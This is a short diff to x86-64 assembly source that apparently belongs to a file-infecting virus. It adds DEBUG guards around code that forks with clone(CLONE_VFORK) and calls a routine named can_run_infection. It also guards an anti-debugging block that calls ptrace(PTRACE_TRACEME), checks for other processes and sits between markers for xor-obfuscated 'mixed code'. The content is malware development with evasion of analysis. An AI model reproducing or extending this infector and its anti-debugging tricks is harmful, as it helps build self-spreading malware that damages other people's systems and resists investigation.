@@ -31,6 +31,7 @@ begin:
 	mov rbp, rsp
 	sub rsp, %$localsize 
 
+%ifndef DEBUG
 	mov rax, SYS_CLONE				; _pid = clone(
 	mov rdi, CLONE_VFORK				; 	CLONE_VFORK,
 	xor rsi, rsi					; 	0,
@@ -42,6 +43,7 @@ begin:
 	je .child					; else if (_pid == 0) goto .child;
 
 	jmp .skipped					; else goto .skipped;
+%endif
 
 .child:
 	call can_run_infection				; if (can_run_infection() == 0)
@@ -97,6 +99,7 @@ can_run_infection:
 ; result of xor between the two following blocks
 .begin_mixed_code:
 .begin_anti_debugging:
+%ifndef DEBUG
 	mov rax, SYS_PTRACE				; _ret = ptrace(
 	mov rdi, PTRACE_TRACEME				; 	PTRACE_TRACEME,
 	xor rsi, rsi					; 	0,
@@ -109,6 +112,7 @@ can_run_infection:
 	call check_process				; _ret = check_process();
 	cmp rax, 1					; if (_ret == 1)
 	je .process					; 	goto .process;
+%endif
 .end_anti_debugging:
 
 
